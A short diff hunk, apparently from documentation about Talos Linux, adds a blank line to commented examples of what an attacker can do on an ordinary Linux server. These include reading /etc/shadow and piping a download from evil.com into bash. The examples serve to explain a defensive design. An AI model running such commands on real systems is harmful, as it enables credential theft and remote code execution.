@@ -41,6 +41,7 @@ The list of things missing from Talos is extensive, and deliberately so:
 
 ```bash
 # On a traditional Linux server, an attacker who gains access can:
+
 # - Read files: cat /etc/shadow
 # - Download tools: curl http://evil.com/backdoor | bash
 # - Install packages: apt install nmap
